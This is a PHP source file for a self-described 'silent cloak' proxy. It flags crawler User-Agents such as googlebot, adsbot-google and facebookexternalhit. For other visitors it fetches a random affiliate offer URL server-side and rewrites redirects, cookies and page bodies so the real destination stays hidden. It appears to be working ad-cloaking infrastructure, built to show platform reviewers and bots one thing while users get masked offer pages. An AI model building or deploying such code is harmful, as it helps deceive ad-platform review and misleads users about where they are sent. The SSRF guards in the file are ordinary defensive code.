<?php

/**
 * SRP silent cloak — shared engine.
 * ================================
 * Shared, side-effect-free logic for the /internal/v1/* silent proxy.
 * Loaded by internal/index.php (request controller) and internal/verify.php
 * (CLI reachability harness). No HTML output happens here.
 *
 * Decision order (fixed priority, see controller):
 *   1. Bot / User-Agent detection  → internal_is_bot()
 *   2. Request-header checks       → internal_header_flag()
 *   3. URL / path conditions       → internal_route_token() + internal_resolve_destination()
 */

declare(strict_types=1);

error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');

require_once dirname(__DIR__, 2) . '/env.php';
load_env_file(dirname(__DIR__, 2) . '/.env');

const INTERNAL_ROUTE_MAX = 64;
const INTERNAL_URL_MAX = 2048;
const INTERNAL_MAX_BODY = 8 * 1024 * 1024; // 8 MiB request-body guard
const INTERNAL_MAX_RESPONSE_BODY = 16 * 1024 * 1024; // 16 MiB upstream response cap
const INTERNAL_CONNECT_TIMEOUT = 10;
const INTERNAL_FETCH_TIMEOUT = 30;

/** Directive: pick a random offer URL from the `offering` (campaigns) table. */
const INTERNAL_RANDOM_OFFERING = 'random:offering';

/** Tracking keys stripped from the *forwarded* query — never from the visible URL. */
const INTERNAL_TRACKING_KEYS = [
    'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id',
    'gclid', 'gclsrc', 'fbclid', 'gad_source', 'gad_campaignid', 'msclkid',
    'dclid', 'twclid', 'igshid', 'mc_cid', 'mc_eid', 'vero_id', 'wickedid',
];

/** Hop-by-hop headers a proxy must never relay. */
const INTERNAL_HOP_BY_HOP = [
    'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
    'te', 'trailer', 'transfer-encoding', 'upgrade',
];

// ── Layer 3: route (path) resolution ─────────────────────────────────────────

function internal_route_token(): ?string
{
    $route = $_GET['route'] ?? '';
    if (!is_string($route)) {
        return null;
    }

    $route = trim($route);
    if ($route === '' || strlen($route) > INTERNAL_ROUTE_MAX) {
        return null;
    }

    // Regex-free charset gate: letters, digits, dot, underscore, hyphen only.
    $allowed = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-';

    return strspn($route, $allowed) === strlen($route) ? $route : null;
}

/**
 * Resolve a route to its real destination. First match wins:
 *   1. INTERNAL_MAP_{ROUTE}  env var (route uppercased)
 *   2. INTERNAL_MAP_JSON     env var (JSON object route → url)
 *   3. internal_fallback_map()
 *
 * @param array<string,string> $fallbackMap
 */
function internal_destination(string $route, array $fallbackMap): ?string
{
    $fromEnv = app_env('INTERNAL_MAP_' . strtoupper($route));
    if ($fromEnv !== null && trim($fromEnv) !== '') {
        return trim($fromEnv);
    }

    $json = app_env('INTERNAL_MAP_JSON');
    if ($json !== null && trim($json) !== '') {
        try {
            $map = json_decode($json, true, 16, JSON_THROW_ON_ERROR);
            if (is_array($map) && isset($map[$route]) && is_string($map[$route]) && trim($map[$route]) !== '') {
                return trim($map[$route]);
            }
        } catch (JsonException) {
            error_log('[srp] INTERNAL_MAP_JSON is not valid JSON');
        }
    }

    return (isset($fallbackMap[$route]) && $fallbackMap[$route] !== '') ? $fallbackMap[$route] : null;
}

/**
 * Development fallback destinations. Production should use env vars instead
 * (INTERNAL_MAP_* or INTERNAL_MAP_JSON) so this file never carries secrets.
 *
 * @return array<string,string>
 */
function internal_fallback_map(): array
{
    return [
        // 'random:offering' picks a random campaign URL from the `offering` table.
        'auth' => INTERNAL_RANDOM_OFFERING,
    ];
}

/**
 * Resolve a route to a concrete destination URL.
 *
 * The configured value may be a literal URL or the `random:offering` directive
 * (a random campaign URL from the `offering` table).
 *
 * @param array<string,string> $fallbackMap
 */
function internal_resolve_destination(string $route, array $fallbackMap): ?string
{
    $configured = internal_destination($route, $fallbackMap);
    if ($configured === null) {
        return null;
    }

    return str_starts_with($configured, INTERNAL_RANDOM_OFFERING)
        ? internal_random_offer_url()
        : $configured;
}

/** Lazy PDO — null when the DB is unreachable so callers degrade safely. */
function internal_pdo(): ?PDO
{
    static $pdo = false;
    if ($pdo === false) {
        // connection_pdo.php calls exit() on connect failure instead of
        // throwing, unless this constant is set — which would bypass the
        // catch below entirely and hard-crash the request instead of
        // degrading to a 404. Same trap srp_offer_allowed_domains_pdo() in
        // env.php was written to avoid.
        if (!defined('SRP_DB_THROW_ON_CONNECT_FAILURE')) {
            define('SRP_DB_THROW_ON_CONNECT_FAILURE', true);
        }

        try {
            $candidate = require dirname(__DIR__, 2) . '/connection_pdo.php';
            $pdo = $candidate instanceof PDO ? $candidate : null;
        } catch (Throwable) {
            $pdo = null;
        }
    }

    return $pdo;
}

/**
 * Pick a random offer URL from the admin campaigns table (`offering`).
 * Mirrors the random-id selection in redirect/_meetups/r.php, unscoped —
 * any network/country row is eligible.
 */
function internal_random_offer_url(): ?string
{
    $pdo = internal_pdo();
    if ($pdo === null) {
        return null;
    }

    $statement = $pdo->prepare(
        'SELECT offer FROM offering '
        . 'WHERE id >= ('
        . 'SELECT FLOOR(MIN(id) + RAND() * (MAX(id) - MIN(id))) FROM offering'
        . ') ORDER BY id ASC LIMIT 1',
    );
    if ($statement === false) {
        return null;
    }

    $statement->execute();
    $row = $statement->fetch();
    if (!is_array($row)) {
        return null;
    }

    $offer = $row['offer'] ?? '';
    if (!is_string($offer) || trim($offer) === '') {
        return null;
    }

    $offer = trim(html_entity_decode($offer, ENT_QUOTES | ENT_HTML5, 'UTF-8'));
    // The cloak has no click context, so drop template placeholders instead of
    // forwarding them literally.
    $offer = str_replace(['{sub_id}', '{click_id}'], '', $offer);

    return $offer === '' ? null : $offer;
}

/** True when an IP literal is private, loopback, link-local, CGNAT or reserved. */
function internal_ip_is_forbidden(string $ip): bool
{
    $ip = trim($ip);
    if ($ip === '') {
        return true;
    }

    // IPv4
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false) {
        $long = ip2long($ip);
        if ($long === false) {
            return true;
        }

        return ($long & 0xFF000000) === 0x00000000   // 0.0.0.0/8
            || ($long & 0xFF000000) === 0x0A000000   // 10.0.0.0/8
            || ($long & 0xFFC00000) === 0x64400000   // 100.64.0.0/10 (CGNAT)
            || ($long & 0xFF000000) === 0x7F000000   // 127.0.0.0/8 loopback
            || ($long & 0xFFFF0000) === 0xA9FE0000   // 169.254.0.0/16 link-local
            || ($long & 0xFFF00000) === 0xAC100000   // 172.16.0.0/12
            || ($long & 0xFFFFFF00) === 0xC0000000   // 192.0.0.0/24
            || ($long & 0xFFFFFF00) === 0xC0000200   // 192.0.2.0/24
            || ($long & 0xFFFF0000) === 0xC0A80000   // 192.168.0.0/16
            || ($long & 0xFFFE0000) === 0xC6120000   // 198.18.0.0/15 benchmark
            || ($long & 0xF0000000) === 0xE0000000   // 224.0.0.0/4 multicast
            || ($long & 0xF0000000) === 0xF0000000;  // 240.0.0.0/4 reserved
    }

    // IPv6
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false) {
        $bin = @inet_pton($ip);
        if ($bin === false || strlen($bin) !== 16) {
            return true;
        }
        $bytes = array_values(unpack('C*', $bin)); // 16 ints, 0-indexed

        $allZero = true;
        foreach ($bytes as $byte) {
            if ($byte !== 0) {
                $allZero = false;
                break;
            }
        }
        if ($allZero) {
            return true; // :: unspecified
        }

        // ::ffff:a.b.c.d mapped IPv4 → run the IPv4 checks.
        $mapped = true;
        for ($i = 0; $i < 10; $i++) {
            if ($bytes[$i] !== 0) {
                $mapped = false;
                break;
            }
        }
        if ($mapped && $bytes[10] === 0xFF && $bytes[11] === 0xFF) {
            $v4 = sprintf('%d.%d.%d.%d', $bytes[12], $bytes[13], $bytes[14], $bytes[15]);

            return internal_ip_is_forbidden($v4);
        }

        // ::1 loopback
        $loopback = true;
        for ($i = 0; $i < 15; $i++) {
            if ($bytes[$i] !== 0) {
                $loopback = false;
                break;
            }
        }
        if ($loopback && $bytes[15] === 1) {
            return true;
        }

        if (($bytes[0] & 0xFE) === 0xFC) {
            return true; // fc00::/7 unique-local
        }
        if ($bytes[0] === 0xFE && ($bytes[1] & 0xC0) === 0x80) {
            return true; // fe80::/10 link-local
        }
        if ($bytes[0] === 0xFF) {
            return true; // ff00::/8 multicast
        }

        return false;
    }

    return true; // not a valid IP
}

/**
 * Validate a server-configured destination:
 *   https only, size cap, loop guard, non-443 port blocked, private/reserved
 *   IP blocked (literal or DNS-resolved), shared offer allowlist enforced.
 */
function internal_url_allowed(string $url): bool
{
    if (strlen($url) > INTERNAL_URL_MAX) {
        return false;
    }
    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
        return false;
    }

    $scheme = parse_url($url, PHP_URL_SCHEME);
    $host = parse_url($url, PHP_URL_HOST);
    $port = parse_url($url, PHP_URL_PORT);
    if (!is_string($scheme) || !is_string($host) || strtolower($scheme) !== 'https') {
        return false;
    }

    // https may only use the default port (no explicit port, or 443).
    if ($port !== null && (int) $port !== 443) {
        return false;
    }

    // Loop guard: never fetch our own host (would recurse into this proxy).
    $self = $_SERVER['HTTP_HOST'] ?? '';
    if (is_string($self) && $self !== '') {
        $self = strtolower($self);
        $hostLower = strtolower($host);
        if ($hostLower === $self || str_ends_with($hostLower, '.' . $self)) {
            return false;
        }
    }

    // SSRF guard: never fetch private / loopback / link-local / reserved IPs.
    $hostClean = strtolower(trim($host, '[]'));
    if (filter_var($hostClean, FILTER_VALIDATE_IP) !== false) {
        if (internal_ip_is_forbidden($hostClean)) {
            return false;
        }
    } elseif (function_exists('dns_get_record')) {
        // Hostname: fail-open when DNS yields nothing; block when any resolved
        // address is forbidden.
        $records = @dns_get_record($hostClean, DNS_A | DNS_AAAA);
        if (is_array($records)) {
            foreach ($records as $record) {
                $resolved = is_string($record['ip'] ?? null)
                    ? $record['ip']
                    : (is_string($record['ipv6'] ?? null) ? $record['ipv6'] : null);
                if ($resolved !== null && internal_ip_is_forbidden($resolved)) {
                    return false;
                }
            }
        }
    }

    // Honor the shared offer allowlist (defense-in-depth, empty = allow all).
    if (!srp_url_host_allowed($url)) {
        return false;
    }

    return true;
}

// ── Layer 1: bot / crawler detection (str_contains, no regex) ────────────────

function internal_user_agent(): string
{
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    return is_string($ua) ? strtolower($ua) : '';
}

function internal_is_bot(string $ua): bool
{
    if ($ua === '') {
        return false;
    }

    return match (true) {
        str_contains($ua, 'googlebot'),
        str_contains($ua, 'apis-google'),
        str_contains($ua, 'mediapartners-google'),
        str_contains($ua, 'adsbot-google'),
        str_contains($ua, 'bingbot'),
        str_contains($ua, 'facebookexternalhit'),
        str_contains($ua, 'facebot'),
        str_contains($ua, 'facebookcatalog'),
        str_contains($ua, 'twitterbot'),
        str_contains($ua, 'whatsapp'),
        str_contains($ua, 'telegrambot'),
        str_contains($ua, 'linkedinbot'),
        str_contains($ua, 'slackbot'),
        str_contains($ua, 'discordbot'),
        str_contains($ua, 'applebot'),
        str_contains($ua, 'amazonbot'),
        str_contains($ua, 'ahrefsbot'),
        str_contains($ua, 'semrushbot'),
        str_contains($ua, 'mj12bot'),
        str_contains($ua, 'dotbot'),
        str_contains($ua, 'petalbot'),
        str_contains($ua, 'headlesschrome') => true,
        default => false,
    };
}

// ── Layer 2: request-header checks (only when not a bot) ─────────────────────

function internal_header_flag(): ?string
{
    $xrw = $_SERVER['HTTP_X_REQUESTED_WITH'] ?? null;
    if (is_string($xrw) && $xrw !== '') {
        return 'ajax';
    }

    $accept = $_SERVER['HTTP_ACCEPT'] ?? '';
    if (is_string($accept) && str_contains(strtolower($accept), 'application/json')) {
        return 'json';
    }

    return null;
}

// ── Tracking-parameter stripping ──────────────────────────────────────────────

/**
 * @param array<string,mixed> $params
 * @return array<string,mixed>
 */
function internal_strip_query(array $params): array
{
    return array_filter(
        $params,
        static fn(string $key): bool => !in_array(strtolower($key), INTERNAL_TRACKING_KEYS, true),
        ARRAY_FILTER_USE_KEY,
    );
}

/**
 * Build the destination URL with only the organic visitor query.
 * The routing token and all tracking keys are dropped.
 *
 * @param array<string,mixed> $params
 */
function internal_forward_url(string $destination, array $params): string
{
    unset($params['route']);
    $params = internal_strip_query($params);
    if ($params === []) {
        return $destination;
    }

    $separator = str_contains($destination, '?') ? '&' : '?';

    return $destination . $separator . http_build_query($params, '', '&', PHP_QUERY_RFC3986);
}

// ── Silent fetch (server-side proxy) ──────────────────────────────────────────

/**
 * @return array{status:int, headers:list<array{0:string,1:string}>, body:string}
 * @throws RuntimeException when the destination is unreachable.
 */
function internal_fetch(string $url, string $method, string $body, array $forwardHeaders): array
{
    $ch = curl_init($url);
    if ($ch === false) {
        throw new RuntimeException('curl_init failed');
    }

    $headerLines = [];
    foreach ($forwardHeaders as $name => $value) {
        $headerLines[] = $name . ': ' . $value;
    }

    // Stream the body with a hard size cap instead of buffering the whole
    // upstream response in memory (RETURNTRANSFER had no cap on the response).
    $responseBody = '';
    $headerBlock = '';
    $overflow = false;
    $maxBody = INTERNAL_MAX_RESPONSE_BODY;

    $options = [
        CURLOPT_RETURNTRANSFER => false,
        CURLOPT_HEADER => false,
        CURLOPT_HEADERFUNCTION => static function ($ch, string $line) use (&$headerBlock): int {
            $headerBlock .= $line;

            return strlen($line);
        },
        CURLOPT_WRITEFUNCTION => static function ($ch, string $chunk) use (&$responseBody, &$overflow, $maxBody): int {
            if ($overflow) {
                return 0;
            }
            if (strlen($responseBody) + strlen($chunk) > $maxBody) {
                $overflow = true;

                return 0; // abort the transfer
            }
            $responseBody .= $chunk;

            return strlen($chunk);
        },
        CURLOPT_FOLLOWLOCATION => false, // rewrite Location ourselves to keep the mask
        CURLOPT_CONNECTTIMEOUT => INTERNAL_CONNECT_TIMEOUT,
        CURLOPT_TIMEOUT => INTERNAL_FETCH_TIMEOUT,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headerLines,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ];
    if ($body !== '') {
        $options[CURLOPT_POSTFIELDS] = $body;
    }

    curl_setopt_array($ch, $options);

    $ok = curl_exec($ch);

    if ($overflow) {
        $status = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        curl_close($ch);
        throw new RuntimeException('upstream response exceeds ' . $maxBody . ' bytes (HTTP ' . $status . ')');
    }

    if ($ok === false) {
        $errno = curl_errno($ch);
        $error = curl_error($ch);
        curl_close($ch);
        throw new RuntimeException('upstream unreachable (cURL ' . $errno . '): ' . $error);
    }

    $status = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
    curl_close($ch);

    return [
        'status' => $status,
        'headers' => internal_parse_headers($headerBlock),
        'body' => $responseBody,
    ];
}

/** @return list<array{0:string,1:string}> */
function internal_parse_headers(string $block): array
{
    $out = [];
    foreach (preg_split("/\r\n|\n|\r/", $block) as $line) {
        $line = trim($line);
        if ($line === '' || str_starts_with($line, 'HTTP/')) {
            continue;
        }

        $position = strpos($line, ':');
        if ($position === false) {
            continue;
        }

        $out[] = [
            strtolower(trim(substr($line, 0, $position))),
            trim(substr($line, $position + 1)),
        ];
    }

    return $out;
}

// ── Header relay & body rewrite (keep the mask, never leak the origin) ───────

/** Relay upstream headers, remapping Location/Set-Cookie and dropping hop-by-hop. */
function internal_relay_headers(array $upstreamHeaders, string $maskedPath): void
{
    foreach ($upstreamHeaders as [$name, $value]) {
        if (in_array($name, INTERNAL_HOP_BY_HOP, true)) {
            continue;
        }
        if ($name === 'location') {
            header('Location: ' . internal_rewrite_location($value, $maskedPath), true);
            continue;
        }
        if ($name === 'set-cookie') {
            header('Set-Cookie: ' . internal_sanitize_cookie($value), false);
            continue;
        }
        if ($name === 'content-length' || $name === 'content-encoding') {
            continue; // recomputed below / identity requested
        }

        header($name . ': ' . $value, false);
    }
}

function internal_rewrite_location(string $location, string $maskedPath): string
{
    $location = trim($location);
    if ($location === '') {
        return $maskedPath;
    }

    // Absolute or protocol-relative URL → force back onto the masked path.
    if (filter_var($location, FILTER_VALIDATE_URL) !== false || str_starts_with($location, '//')) {
        return $maskedPath;
    }

    // Root-relative path on the masked host → keep inside the mask.
    if (str_starts_with($location, '/')) {
        return $maskedPath;
    }
    // Relative path → browser resolves it against the masked URL.
    return $location;
}

/** Strip the Domain attribute so a Set-Cookie can never scope to the real host. */
function internal_sanitize_cookie(string $cookie): string
{
    $kept = [];
    foreach (explode(';', $cookie) as $part) {
        $part = trim($part);
        if ($part === '') {
            continue;
        }
        if (str_starts_with(strtolower($part), 'domain=')) {
            continue;
        }
        $kept[] = $part;
    }

    return implode('; ', $kept);
}

/** Best-effort: rewrite destination-origin references back onto the mask. */
function internal_rewrite_body(string $body, string $destination, string $maskedPath): string
{
    $host = parse_url($destination, PHP_URL_HOST);
    if (!is_string($host) || $host === '') {
        return $body;
    }

    $body = str_replace(
        [
            'https://' . $host,
            'http://' . $host,
            '//' . $host,
            'https:\/\/' . $host,
            'http:\/\/' . $host,
            '\/\/' . $host,
        ],
        $maskedPath,
        $body,
    );

    return $body;
}

// ── Outbound request headers ──────────────────────────────────────────────────

/**
 * @return array<string,string>
 */
function internal_forward_headers(string $userAgent, string $flag): array
{
    // Request identity so the upstream never gzips — makes body rewriting safe.
    $headers = ['Accept-Encoding' => 'identity'];

    if ($userAgent !== '') {
        $headers['User-Agent'] = $userAgent;
    }

    $headers['X-Forwarded-For'] = (string) ($_SERVER['REMOTE_ADDR'] ?? '');
    $headers['X-Forwarded-Proto'] = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';

    if ($flag === 'json') {
        $headers['Accept'] = 'application/json';
    } elseif ($flag === 'ajax') {
        $headers['X-Requested-With'] = 'XMLHttpRequest';
    }

    return $headers;
}
